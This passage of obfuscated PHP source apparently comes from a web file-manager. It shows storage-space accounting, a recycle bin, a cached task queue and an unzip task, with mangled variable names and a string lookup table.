$‚Ã™Í‚ = $this->sourceInfo($š‘±ÔÄö); $¿Â±Öà¤ = array($Š¿²Ö»İ[630] => 1, $Š¿²Ö»İ[633] => $‚Ã™Í‚[$Š¿²Ö»İ[554]], $Š¿²Ö»İ[636] => array($Š¿²Ö»İ[596], $‚Ã™Í‚[$Š¿²Ö»İ[569]] . $š‘±ÔÄö . $Š¿²Ö»İ[597])); $Ëêü—Ôë = $Š¿²Ö»İ[2269]; $íŸş€“ = $this->field($Ëêü—Ôë)->where($¿Â±Öà¤)->select(); $¿Â±Öà¤[$Š¿²Ö»İ[469]] = 0; $ı—¢©© = $this->field($Ëêü—Ôë)->where($¿Â±Öà¤)->select(); if (!$ı—¢©©) { return; } $íŸş€“[] = $‚Ã™Í‚; $íŸş€“ = array_to_keyvalue($íŸş€“, $Š¿²Ö»İ[194]); foreach ($íŸş€“ as $¶ŸËé˜‹ => $¾¾±ñ—) { $íŸş€“[$¶ŸËé˜‹][$Š¿²Ö»İ[2270]] = $íŸş€“[$¶ŸËé˜‹][$Š¿²Ö»İ[89]]; $íŸş€“[$¶ŸËé˜‹][$Š¿²Ö»İ[89]] = 0; } foreach ($ı—¢©© as $¾¾±ñ—) { $ôò’ê¡± = $¾¾±ñ—[$Š¿²Ö»İ[193]] . $Š¿²Ö»İ[22]; if (!isset($íŸş€“[$ôò’ê¡±])) { continue; } if ($¾¾±ñ—[$Š¿²Ö»İ[489]] == $íŸş€“[$ôò’ê¡±][$Š¿²Ö»İ[489]]) { $íŸş€“[$ôò’ê¡±][$Š¿²Ö»İ[89]] += $¾¾±ñ—[$Š¿²Ö»İ[89]]; } } foreach ($íŸş€“ as $¾¾±ñ—) { $¨˜¸ü’Ò = $this->parentLevelArray($¾¾±ñ—[$Š¿²Ö»İ[569]]); foreach ($¨˜¸ü’Ò as $ôò’ê¡±) { $ôò’ê¡± = $ôò’ê¡± . $Š¿²Ö»İ[22]; if (!isset($íŸş€“[$ôò’ê¡±])) { continue; } if ($¾¾±ñ—[$Š¿²Ö»İ[489]] == $íŸş€“[$ôò’ê¡±][$Š¿²Ö»İ[489]]) { $íŸş€“[$ôò’ê¡±][$Š¿²Ö»İ[89]] += $¾¾±ñ—[$Š¿²Ö»İ[89]]; } } } $½Æ¿Ğ = array(); foreach ($íŸş€“ as $¾¾±ñ—) { if ($¾¾±ñ—[$Š¿²Ö»İ[89]] == $¾¾±ñ—[$Š¿²Ö»İ[2270]]) { continue; } $½Æ¿Ğ[] = array($Š¿²Ö»İ[194], $¾¾±ñ—[$Š¿²Ö»İ[194]], $Š¿²Ö»İ[89], $¾¾±ñ—[$Š¿²Ö»İ[89]]); } $this->saveAll($½Æ¿Ğ); } public function userSpaceReset($ˆ £Œš’ = false) { $¥õŠø­¯ =& $_SERVER[Õò”†—·]; $¾Éäéî“ = $this->where(array($¥õŠø­¯[191] => self::TYPE_USER, $¥õŠø­¯[554] => $ˆ £Œš’, $¥õŠø­¯[469] => 0))->sum($¥õŠø­¯[89]); $¾Éäéî“ = !$¾Éäéî“ || $¾Éäéî“ <= 0 ? 0 : $¾Éäéî“; Model($¥õŠø­¯[562])->userEdit($ˆ £Œš’, array($¥õŠø­¯[1942] => $¾Éäéî“)); } public function targetSpaceUpdate($è¬Áõí·, $¿¥ıÖ¬) { $¿ØÚû–ˆ =& $_SERVER[Õò”†—·]; if (!$¿¥ıÖ¬) { return; } if (!in_array($è¬Áõí·, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ ˜Ù¨Ã¢ = $this->targetSpaceSize($è¬Áõí·, $¿¥ıÖ¬); if ($è¬Áõí· == self::TYPE_USER) { Model($¿ØÚû–ˆ[562])->userEdit($¿¥ıÖ¬, array($¿ØÚû–ˆ[1942] => $ ˜Ù¨Ã¢)); } else { if ($è¬Áõí· == self::TYPE_GROUP) { Model($¿ØÚû–ˆ[570])->groupEdit($¿¥ıÖ¬, array($¿ØÚû–ˆ[1942] => $ ˜Ù¨Ã¢)); } } } public function targetSpaceSize($œó°¶ıê, $à²şñ¸) { $öè¢ã× =& $_SERVER[Õò”†—·]; $àÎ·µ¡ = 0; $ë¤ öòº = $this->targetSourceRoot($œó°¶ıê, $à²şñ¸, !0); foreach ($ë¤ öòº as $«’ŠæÙÁ) { if (!$«’ŠæÙÁ) { continue; } $àÎ·µ¡ += floatval($«’ŠæÙÁ[$öè¢ã×[89]]); $íø‰•ÉŠ = array($öè¢ã×[636] => array($öè¢ã×[596], $öè¢ã×[579] . $«’ŠæÙÁ[$öè¢ã×[194]] . $öè¢ã×[597])); $İÆƒ›ãÚ = Model($öè¢ã×[487])->field($öè¢ã×[475])->where($íø‰•ÉŠ)->select(); $İÆƒ›ãÚ = array_to_keyvalue($İÆƒ›ãÚ, $öè¢ã×[22], $öè¢ã×[194]); $İÆƒ›ãÚ = array_unique(array_filter($İÆƒ›ãÚ)); if ($İÆƒ›ãÚ) { $íø‰•ÉŠ = array($öè¢ã×[475] => array($öè¢ã×[476], $İÆƒ›ãÚ)); $àÎ·µ¡ += floatval($this->where($íø‰•ÉŠ)->sum($öè¢ã×[89])); } } $àÎ·µ¡ = !$àÎ·µ¡ || $àÎ·µ¡ <= 0 ? 0 : $àÎ·µ¡; return $àÎ·µ¡; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($½‘õ¥¨Õ) { return $this->fileTypeProfile($½‘õ¥¨Õ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($óéŠá) { return $this->fileTypeProfile($óéŠá, SourceModel::TYPE_GROUP); } private function fileTypeProfile($©Ò¿µúã, $²©øÌ€·) { $òŠï ‰ =& $_SERVER[Õò”†—·]; $ÊÀìÏñÍ = $òŠï ‰[2271] . $©Ò¿µúã . $òŠï ‰[21] . $²©øÌ€·; $–®ıâß = Cache::get($ÊÀìÏñÍ); if ($–®ıâß) { return $–®ıâß; } $Õ½¸¯ˆ = array($òŠï ‰[630] => 0); if ($©Ò¿µúã != !1) { $Õ½¸¯ˆ[$òŠï ‰[554]] = $©Ò¿µúã; $Õ½¸¯ˆ[$òŠï ‰[191]] = $²©øÌ€·; } $èã¶Ò¼ = array(); $èã¶Ò¼[$òŠï ‰[2272]] = array($òŠï ‰[2273] => LNG($òŠï ‰[2272]), $òŠï ‰[2274] => $this->where($Õ½¸¯ˆ)->count(), $òŠï ‰[601] => $this->where($Õ½¸¯ˆ)->sum($òŠï ‰[89])); $ÍõÙ¬÷× = KodIO::fileTypeList(); foreach ($ÍõÙ¬÷× as $©ôõê­Ì => $ŠÖÛß‘) { $Õ½¸¯ˆ[$òŠï ‰[470]] = $this->fileTypeWhere($©ôõê­Ì); $èã¶Ò¼[$©ôõê­Ì] = array($òŠï ‰[2273] => $ŠÖÛß‘[$òŠï ‰[42]], $òŠï ‰[2274] => $this->where($Õ½¸¯ˆ)->count(), $òŠï ‰[601] => $this->where($Õ½¸¯ˆ)->sum($òŠï ‰[89])); } Cache::set($ÊÀìÏñÍ, $èã¶Ò¼, 1200); return $èã¶Ò¼; } public function fileNameExist($·İ”›Ìï, $ˆµû…›µ) { $¦”ìî¬œ =& $_SERVER[Õò”†—·]; $©ßÛº®… = $this->field($¦”ìî¬œ[2275])->where(array($¦”ìî¬œ[193] => $·İ”›Ìï, $¦”ìî¬œ[42] => $ˆµû…›µ, $¦”ìî¬œ[489] => 0))->find(); return is_array($©ßÛº®…) ? $©ßÛº®…[$¦”ìî¬œ[194]] : !1; } public function childList($Éá¬­úÕ) { $ˆ“•ÙšØ =& $_SERVER[Õò”†—·]; $òÚö— = $ˆ“•ÙšØ[2248] . $Éá¬­úÕ; if (isset(self::$cacheChildList[$òÚö—])) { return self::$cacheChildList[$òÚö—]; } $âæşÒëæ = array($ˆ“•ÙšØ[193] => intval($Éá¬­úÕ), $ˆ“•ÙšØ[489] => 0); $š³ÆŠÕò = $this->where($âæşÒëæ)->select(); $š³ÆŠÕò = $š³ÆŠÕò ? $š³ÆŠÕò : array(); self::$cacheChildList[$òÚö—] = $š³ÆŠÕò; foreach ($š³ÆŠÕò as $’ã¤¥¤€) { $òÚö— = $ˆ“•ÙšØ[517] . $’ã¤¥¤€[$ˆ“•ÙšØ[194]]; self::$cacheSourceInfo[$òÚö—] = $’ã¤¥¤€; } return $š³ÆŠÕò; } public function fileNameAuto($ì•ò¶Ã«, $£·ğÀíø, $Ö€Ü³ùŸ = REPEAT_RENAME, $ˆ‚ıç´è = false) { $¡ÒØ»¿Ï =& $_SERVER[Õò”†—·]; $§ØìñØ = get_path_ext($£·ğÀíø); $ë„ó²ÙÚ = $§ØìñØ ? get_path_ext_name($£·ğÀíø) . $¡ÒØ»¿Ï[2276] . $§ØìñØ : $£·ğÀíø . $¡ÒØ»¿Ï[444]; $¦ÒÏò´ = array($¡ÒØ»¿Ï[193] => $ì•ò¶Ã«, $¡ÒØ»¿Ï[489] => 0, $¡ÒØ»¿Ï[42] => array($¡ÒØ»¿Ï[443], $ë„ó²ÙÚ)); $¬äğŸœ = $this->field($¡ÒØ»¿Ï[42])->where($¦ÒÏò´)->select(); $˜ş±úİ = array_to_keyvalue($¬äğŸœ, $¡ÒØ»¿Ï[22], $¡ÒØ»¿Ï[42]); return $this->fileNameAutoGet($˜ş±úİ, $£·ğÀíø, $Ö€Ü³ùŸ, $ˆ‚ıç´è); } public function fileNameAutoGet($„ò™ò­¹, $æ«ßâİ®, $İùÅî§Ï, $øÚãÄƒ£) { $„×œüõ„ =& $_SERVER[Õò”†—·]; if ($İùÅî§Ï == REPEAT_REPLACE || !$„ò™ò­¹ || !in_array_not_case($æ«ßâİ®, $„ò™ò­¹) || $øÚãÄƒ£ && $İùÅî§Ï != REPEAT_RENAME_FOLDER) { return $æ«ßâİ®; } if ($İùÅî§Ï == REPEAT_SKIP) { return !1; } $¨Øé¬¤² = $„×œüõ„[20] . get_path_ext($æ«ßâİ®); $¨Øé¬¤² = $¨Øé¬¤² == $„×œüõ„[20] || $øÚãÄƒ£ ? $„×œüõ„[22] : $¨Øé¬¤²; for ($Ã‘¨Áî‰ = 1; $Ã‘¨Áî‰ <= count($„ò™ò­¹) + 1; $Ã‘¨Áî‰++) { $—Òİ¤Õ¸ = substr($æ«ßâİ®, 0, strlen($æ«ßâİ®) - strlen($¨Øé¬¤²)); $èŒÑôœ³ = $—Òİ¤Õ¸ . "\x28{$Ã‘¨Áî‰}\x29{$¨Øé¬¤²}"; if (!in_array_not_case($èŒÑôœ³, $„ò™ò­¹)) { return $èŒÑôœ³; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\x72\x63\145\x5f\x72\145\x63\x79\143\154\145"; protected $dataAuto = array(array("\x63\162\145\141\x74\x65\x54\151\x6d\145", "\164\151\x6d\x65", "\151\x6e\x73\145\162\164", "\146\x75\156\x63\x74\x69\x6f\x6e")); public function listData($ÆŞ—êó = false) { $„úŠ¤Ò =& $_SERVER[Õò”†—·]; $ÆŞ—êó = $ÆŞ—êó ? $ÆŞ—êó : USER_ID; $ÈÕ³ÅñÊ = $this->where(array($„úŠ¤Ò[1746] => $ÆŞ—êó))->select(); return array_to_keyvalue($ÈÕ³ÅñÊ, $„úŠ¤Ò[22], $„úŠ¤Ò[194]); } public function moveToRecycle($ğò–²‚Ä) { $¼¸ëœÓ =& $_SERVER[Õò”†—·]; $Õ ¼†½ = Model($¼¸ëœÓ[1388]); $•Ë±Ã¸© = $Õ ¼†½->sourceInfo($ğò–²‚Ä); if (!$•Ë±Ã¸© || $•Ë±Ã¸©[$¼¸ëœÓ[489]] == $¼¸ëœÓ[101]) { return; } $Å€èœ©• = array($¼¸ëœÓ[475] => $ğò–²‚Ä, $¼¸ëœÓ[1746] => USER_ID, $¼¸ëœÓ[632] => $•Ë±Ã¸©[$¼¸ëœÓ[191]], $¼¸ëœÓ[633] => $•Ë±Ã¸©[$¼¸ëœÓ[554]], $¼¸ëœÓ[636] => $•Ë±Ã¸©[$¼¸ëœÓ[569]]); $this->add($Å€èœ©•); $this->recycleMove($ğò–²‚Ä, 1); if ($•Ë±Ã¸©[$¼¸ëœÓ[469]] == $¼¸ëœÓ[101]) { $’ÕŒæáÑ = array($¼¸ëœÓ[636] => array($¼¸ëœÓ[596], $•Ë±Ã¸©[$¼¸ëœÓ[569]] . $ğò–²‚Ä . $¼¸ëœÓ[597])); $Õ ¼†½->where($’ÕŒæáÑ)->setField($¼¸ëœÓ[489], 1); } } public function clear() { $this->remove(!1); } public function remove($¨â›ëó¹ = false, $†ºÒû’Ë = false) { $§»æÒÚô =& $_SERVER[Õò”†—·]; $†ºÒû’Ë = $†ºÒû’Ë ? $†ºÒû’Ë : USER_ID; $º±öÓ = Model($§»æÒÚô[1388]); $ä¨©¾™ = $this->listData($†ºÒû’Ë); $¨â›ëó¹ = $¨â›ëó¹ === !1 ? !1 : $¨â›ëó¹; $ŸÂõÖ©† = array(); foreach ($ä¨©¾™ as $²·ì‘¾‚) { if ($¨â›ëó¹ != !1 && !in_array($²·ì‘¾‚, $¨â›ëó¹)) { continue; } $û‘Äº×ş = $º±öÓ->sourceInfo($²·ì‘¾‚); $º±öÓ->remove($²·ì‘¾‚, !1); $â £Æ·š = $û‘Äº×ş[$§»æÒÚô[191]] . $§»æÒÚô[21] . $û‘Äº×ş[$§»æÒÚô[554]]; $ŸÂõÖ©†[$â £Æ·š] = array($§»æÒÚô[632] => $û‘Äº×ş[$§»æÒÚô[191]], $§»æÒÚô[554] => $û‘Äº×ş[$§»æÒÚô[554]]); $this->where(array($§»æÒÚô[194] => $²·ì‘¾‚))->delete(); } foreach ($ŸÂõÖ©† as $óúî‹–ü) { $º±öÓ->targetSpaceUpdate($óúî‹–ü[$§»æÒÚô[191]], $óúî‹–ü[$§»æÒÚô[554]]); } } public function restore($ÇŸ¸İ»ƒ = false) { $Ÿôì±ŸÁ = $this->listData(); $this->_restoreSource($Ÿôì±ŸÁ, $ÇŸ¸İ»ƒ); } public function removeUserAll($ÍÒ„¶û) { $this->remove(!1, $ÍÒ„¶û); } public function restoreItem($¹×«¦Ğï) { $this->_restoreSource(array($¹×«¦Ğï), array($¹×«¦Ğï)); } private function _restoreSource($“§®¬İ”, $î‰ó‚ñ¸) { $“ÖÒ‘§õ =& $_SERVER[Õò”†—·]; $ı‰©ñÔ‘ = Model($“ÖÒ‘§õ[1388]); $î‰ó‚ñ¸ = $î‰ó‚ñ¸ == !1 ? !1 : $î‰ó‚ñ¸; if (!$“§®¬İ”) { return !0; } $ÇĞ´Ğè = array(); foreach ($“§®¬İ” as $ğå«Ÿ™) { if ($î‰ó‚ñ¸ != !1 && !in_array($ğå«Ÿ™, $î‰ó‚ñ¸)) { continue; } $ˆ‰íÁÌ£ = $ı‰©ñÔ‘->sourceInfo($ğå«Ÿ™); $ÊÎˆí¿Ï = $ı‰©ñÔ‘->sourceInfo($ˆ‰íÁÌ£[$“ÖÒ‘§õ[193]]); if ($ÊÎˆí¿Ï[$“ÖÒ‘§õ[489]] == $“ÖÒ‘§õ[101]) { continue; } $ı‰©ñÔ‘->lockMoveStart($ğå«Ÿ™); $this->recycleMove($ğå«Ÿ™, 0); if ($ˆ‰íÁÌ£[$“ÖÒ‘§õ[469]] == $“ÖÒ‘§õ[101]) { $ÏİÁ´ÆÄ = array($“ÖÒ‘§õ[636] => array($“ÖÒ‘§õ[596], $ˆ‰íÁÌ£[$“ÖÒ‘§õ[569]] . $ğå«Ÿ™ . $“ÖÒ‘§õ[597])); $ı‰©ñÔ‘->where($ÏİÁ´ÆÄ)->setField($“ÖÒ‘§õ[489], 0); $this->restoreFolderChildren($ğå«Ÿ™, $“§®¬İ”); } $this->where(array($“ÖÒ‘§õ[194] => $ğå«Ÿ™))->delete(); $ı‰©ñÔ‘->folderSizeReset($ˆ‰íÁÌ£[$“ÖÒ‘§õ[193]]); $ÇĞ´Ğè[] = $ˆ‰íÁÌ£[$“ÖÒ‘§õ[193]]; if ($ˆ‰íÁÌ£[$“ÖÒ‘§õ[469]] == $“ÖÒ‘§õ[101]) { $ÇĞ´Ğè[] = $ğå«Ÿ™; } $ı‰©ñÔ‘->lockMoveEnd($ğå«Ÿ™); } $ı‰©ñÔ‘->updateModifyTime($ÇĞ´Ğè); } private function restoreFolderChildren($‚ÃêîÍ’, $ãá‹®şã) { $¼”¥§ÔŒ =& $_SERVER[Õò”†—·]; $Ø°ş¾ƒ€ = Model($¼”¥§ÔŒ[1388]); $‰Ÿìˆ‘ó = array($¼”¥§ÔŒ[194] => array($¼”¥§ÔŒ[17], array())); foreach ($ãá‹®şã as $ƒ„Â‹ê) { if ($ƒ„Â‹ê == $‚ÃêîÍ’) { continue; } if (!$Ø°ş¾ƒ€->isParentOf($‚ÃêîÍ’, $ƒ„Â‹ê)) { continue; } $«¶»’¸› = $Ø°ş¾ƒ€->sourceInfo($ƒ„Â‹ê); if ($«¶»’¸›[$¼”¥§ÔŒ[469]] == $¼”¥§ÔŒ[101]) { $‰Ÿìˆ‘ó[] = array($¼”¥§ÔŒ[636] => array($¼”¥§ÔŒ[596], $«¶»’¸›[$¼”¥§ÔŒ[569]] . $ƒ„Â‹ê . $¼”¥§ÔŒ[597])); } else { $‰Ÿìˆ‘ó[$¼”¥§ÔŒ[194]][1][] = $ƒ„Â‹ê; } } if (!$‰Ÿìˆ‘ó[$¼”¥§ÔŒ[194]][1]) { unset($‰Ÿìˆ‘ó[$¼”¥§ÔŒ[194]]); } if (!$‰Ÿìˆ‘ó) { return; } if (is_array($‰Ÿìˆ‘ó[$¼”¥§ÔŒ[194]]) && is_array($‰Ÿìˆ‘ó[$¼”¥§ÔŒ[194]][1])) { $‰Ÿìˆ‘ó[$¼”¥§ÔŒ[194]][1] = array_unique($‰Ÿìˆ‘ó[$¼”¥§ÔŒ[194]][1]); } $‰Ÿìˆ‘ó[$¼”¥§ÔŒ[1050]] = $¼”¥§ÔŒ[2056]; $Ø°ş¾ƒ€->where($‰Ÿìˆ‘ó)->setField($¼”¥§ÔŒ[489], 1); } private function recycleMove($ßÉñ£˜ô, $ÜòĞ´¸ã = 1) { $·òş©àÙ =& $_SERVER[Õò”†—·]; $Î´®†¹ = Model($·òş©àÙ[1388]); $âÏÍãÊÉ = Model($·òş©àÙ[2277]); $Ìµ€×œ… = array($·òş©àÙ[194] => $ßÉñ£˜ô); if ($ÜòĞ´¸ã) { $Î´®†¹->where($Ìµ€×œ…)->setField($·òş©àÙ[489], 1); $âÏÍãÊÉ->eventRecycle($ßÉñ£˜ô, $·òş©àÙ[2278]); } else { $ëà´™… = $Î´®†¹->where($Ìµ€×œ…)->find(); $ÜÇ¦şÎ = $ëà´™…[$·òş©àÙ[469]] == $·òş©àÙ[101]; $åêäŠ¿ï = $Î´®†¹->fileNameAuto($ëà´™…[$·òş©àÙ[193]], $ëà´™…[$·òş©àÙ[42]], REPEAT_RENAME_FOLDER, $ÜÇ¦şÎ); if ($åêäŠ¿ï != $ëà´™…[$·òş©àÙ[42]]) { $Î´®†¹->rename($ßÉñ£˜ô, $åêäŠ¿ï); } $Î´®†¹->where($Ìµ€×œ…)->setField($·òş©àÙ[489], 0); $âÏÍãÊÉ->eventRecycle($ßÉñ£˜ô, $·òş©àÙ[2279]); } } } goto EªáÛ†Ş; BìäÙ­‰¢•: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\x73\153\x51\165\145\x75\145\114\x65\156\x67\x74\x68"; const QUEUE_DATA = "\164\141\x73\153\x51\165\145\x75\145\104\x61\x74\x61"; const QUEUE_TIME = "\164\141\x73\x6b\121\165\145\x75\x65\x4c\x61\x73\x74\122\x75\156"; const QUEUE_THREAD = "\x74\141\x73\153\x51\x75\145\165\x65\x54\x68\162\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Şâ¬´­ù, $üŞ®Ê¿¶ = array(), $ËÌ¨Á¸ = '', $¿Éá¡ç = '') { $Ë÷±µ½ë =& $_SERVER[Õò”†—·]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¿Éá¡ç && array_find_by_field(self::$listData, $Ë÷±µ½ë[107], $¿Éá¡ç)) { return !0; } if ($¿Éá¡ç && array_find_by_field(self::$listDataAdd, $Ë÷±µ½ë[107], $¿Éá¡ç)) { return !0; } self::$listDataAdd[] = array($Ë÷±µ½ë[325] => $Şâ¬´­ù, $Ë÷±µ½ë[1853] => $üŞ®Ê¿¶, $Ë÷±µ½ë[510] => $ËÌ¨Á¸, $Ë÷±µ½ë[107] => $¿Éá¡ç); return !0; } public static function addSubmit() { $¿Şå§‘ =& $_SERVER[Õò”†—·]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($¿Şå§‘[1854] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $¿Şå§‘[22], $¿Şå§‘[510])), $¿Şå§‘[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($´Óêæç“, $ªÊÌ¤¹› = array(), $ Ç²©Ÿº = '', $½Ë‘êùà = '') { $˜çö·ì® =& $_SERVER[Õò”†—·]; if (self::count() >= self::MAX_LENGTH) { return !1; } $‘½ë¸ãĞ = self::getAll(); if ($½Ë‘êùà && array_find_by_field($‘½ë¸ãĞ, $˜çö·ì®[107], $½Ë‘êùà)) { return !0; } $‘½ë¸ãĞ[] = array($˜çö·ì®[325] => $´Óêæç“, $˜çö·ì®[1853] => $ªÊÌ¤¹›, $˜çö·ì®[510] => $ Ç²©Ÿº, $˜çö·ì®[107] => $½Ë‘êùà); self::setAll($‘½ë¸ãĞ); write_log($˜çö·ì®[1854] . $ Ç²©Ÿº, $˜çö·ì®[198]); return !0; } public static function run() { $ÆĞÒ‘€Í =& $_SERVER[Õò”†—·]; $¯äóÙùÆ = self::getAll(); $şğá¸ô = array_shift($¯äóÙùÆ); if (!$şğá¸ô) { return !1; } self::setAll($¯äóÙùÆ); $­ãåüğí = timeFloat(); $ı‚ÈûÀ = $ÆĞÒ‘€Í[22]; try { $ı‚ÈûÀ = Hook::apply($şğá¸ô[$ÆĞÒ‘€Í[325]], $şğá¸ô[$ÆĞÒ‘€Í[1853]]); } catch (Exception $ú€ÛÚ–€) { write_log($ú€ÛÚ–€, $ÆĞÒ‘€Í[1236]); } $ÁÀñÆäë = number_format(timeFloat() - $­ãåüğí, 3) . $ÆĞÒ‘€Í[1771]; if ($ı‚ÈûÀ && is_string($ı‚ÈûÀ)) { $ÁÀñÆäë = $ÁÀñÆäë . $ÆĞÒ‘€Í[1855] . $ı‚ÈûÀ; } write_log($ÆĞÒ‘€Í[1856] . $şğá¸ô[$ÆĞÒ‘€Í[510]] . $ÆĞÒ‘€Í[1857] . $ÁÀñÆäë, $ÆĞÒ‘€Í[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $—Ú³í® =& $_SERVER[Õò”†—·]; $×…»‘£µ = self::threadCount() + 1; if ($×…»‘£µ > 3 || !self::count()) { return; } write_log($—Ú³í®[1858] . $×…»‘£µ, $—Ú³í®[198]); Cache::set(self::QUEUE_THREAD, $×…»‘£µ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($—Ú³í®[1859], $—Ú³í®[198]); } public static function getKey($¨Ö™õ°ï, $òÌ¹ğ¾ğ = "\x69\x6e\164") { $©½¦î™· =& $_SERVER[Õò”†—·]; Cache::removeMemory($¨Ö™õ°ï); $îÅÀ¡ = Cache::get($¨Ö™õ°ï); if ($òÌ¹ğ¾ğ == $©½¦î™·[348]) { return $îÅÀ¡ ? intval($îÅÀ¡) : 0; } if ($òÌ¹ğ¾ğ == $©½¦î™·[1860]) { return is_array($îÅÀ¡) ? $îÅÀ¡ : array(); } return $îÅÀ¡; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[Õò”†—·][1860]); } public static function setAll($Ç«÷•) { $×šüíÉ” = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Ç«÷•), $×šüíÉ”); Cache::set(self::QUEUE_DATA, $Ç«÷•, $×šüíÉ”); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($æ·ĞÎÅÚ, $×£¢’™ = 5.0) { if (!$æ·ĞÎÅÚ) { return; } $£»é§£é = Cache::get($æ·ĞÎÅÚ); if (!$£»é§£é || timeFloat() - floatVal($£»é§£é) >= $×£¢’™) { Cache::set($æ·ĞÎÅÚ, timeFloat(), $×£¢’™ * 10); return !0; } return !1; } public static function timeLimitCall($Ü°«€©Ş, $¹¸¨Ÿï, $““Ó¥úğ, $„¹¿…‘Ÿ = 5.0) { $À›‘ë  =& $_SERVER[Õò”†—·]; if (!$Ü°«€©Ş || !$¹¸¨Ÿï) { return; } self::$asyncAdd = !0; $øá±éÊø = $À›‘ë [1861]; $ì‡ÉŠ°æ = Cache::get($øá±éÊø, !0); $ğÅŸíù = array($À›‘ë [1862] => timeFloat(), $À›‘ë [1863] => timeFloat(), $À›‘ë [325] => $¹¸¨Ÿï, $À›‘ë [1853] => $““Ó¥úğ, $À›‘ë [207] => $„¹¿…‘Ÿ); if (is_array($ì‡ÉŠ°æ[$Ü°«€©Ş])) { $ğÅŸíù[$À›‘ë [1863]] = $ì‡ÉŠ°æ[$Ü°«€©Ş][$À›‘ë [1863]]; } if (is_array($ì‡ÉŠ°æ[$Ü°«€©Ş])) { if (timeFloat() - $ì‡ÉŠ°æ[$Ü°«€©Ş][$À›‘ë [1862]] < $ğÅŸíù[$À›‘ë [207]] * 0.3) { return; } $ğÅŸíù[$À›‘ë [1863]] = $ì‡ÉŠ°æ[$Ü°«€©Ş][$À›‘ë [1863]]; } $ì‡ÉŠ°æ[$Ü°«€©Ş] = $ğÅŸíù; Cache::set($øá±éÊø, $ì‡ÉŠ°æ, 60); Cache::removeMemory($øá±éÊø); write_log($À›‘ë [1864] . $Ü°«€©Ş . $À›‘ë [84] . $¹¸¨Ÿï, $À›‘ë [198]); } public static function timeLimitCallLoop() { $©ˆÉó¹ =& $_SERVER[Õò”†—·]; $×Şƒ”˜ = array($©ˆÉó¹[1865]); $Öê­ = in_array(strtolower(ACTION), $×Şƒ”˜); if (!$Öê­ && !self::$asyncAdd) { return; } $¿«“Ñë» = $©ˆÉó¹[1861]; $‰ü¿ˆÍê = Cache::get($¿«“Ñë», !0); if (!$‰ü¿ˆÍê || count($‰ü¿ˆÍê) <= 0) { return; } $×¾áãÅ = !1; $Õ†´öÆ = timeFloat(); $ÒôŞî—ò = array(); foreach ($‰ü¿ˆÍê as $—›Š€Ê => $ÂŸ§°) { if ($Õ†´öÆ - $ÂŸ§°[$©ˆÉó¹[1863]] > $ÂŸ§°[$©ˆÉó¹[207]]) { $×¾áãÅ = !0; try { Hook::apply($ÂŸ§°[$©ˆÉó¹[325]], $ÂŸ§°[$©ˆÉó¹[1853]]); write_log($©ˆÉó¹[1866] . $—›Š€Ê . $©ˆÉó¹[84] . $ÂŸ§°[$©ˆÉó¹[325]] . $©ˆÉó¹[1867] . ACTION, $©ˆÉó¹[198]); } catch (Exception $ìı²öŒÏ) { } continue; } $ÒôŞî—ò[$—›Š€Ê] = $ÂŸ§°; } if (!$×¾áãÅ) { return; } if (!$ÒôŞî—ò) { return Cache::remove($¿«“Ñë»); } Cache::set($¿«“Ñë», $ÒôŞî—ò, 60); Cache::removeMemory($¿«“Ñë»); } public static function finished($à›…”™†, $ââïÒê) { $üñ«ÇÆ¦ =& $_SERVER[Õò”†—·]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($üñ«ÇÆ¦[325] => $à›…”™†, $üñ«ÇÆ¦[1853] => $ââïÒê); } private static function finishedRun() { $ö¨†˜¹â =& $_SERVER[Õò”†—·]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $€¤­‰¾Ö) { try { Hook::apply($€¤­‰¾Ö[$ö¨†˜¹â[325]], $€¤­‰¾Ö[$ö¨†˜¹â[1853]]); } catch (Exception $ƒ±ø”€¬) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ı¼ÊºŠÌ =& $_SERVER[Õò”†—·]; parent::startAfter(); Hook::bind($ı¼ÊºŠÌ[1868], array($this, $ı¼ÊºŠÌ[1869])); Hook::bind($ı¼ÊºŠÌ[1247], array($this, $ı¼ÊºŠÌ[1870])); Hook::bind($ı¼ÊºŠÌ[1871], array($this, $ı¼ÊºŠÌ[1872])); $“±‰á‰ =& $this->task; $“±‰á‰[$ı¼ÊºŠÌ[1873]] = $ı¼ÊºŠÌ[1248]; if (!$“±‰á‰[$ı¼ÊºŠÌ[1643]]) { $“±‰á‰[$ı¼ÊºŠÌ[1643]] = LNG($ı¼ÊºŠÌ[1874]); } } protected function endAfter() { $ı¬åÄÛ =& $_SERVER[Õò”†—·]; parent::endAfter(); Hook::unbind($ı¬åÄÛ[1868], array($this, $ı¬åÄÛ[1869])); Hook::unbind($ı¬åÄÛ[1247], array($this, $ı¬åÄÛ[1870])); Hook::unbind($ı¬åÄÛ[1871], array($this, $ı¬åÄÛ[1872])); } public function updateAfter() { $÷–çÜÓ— =& 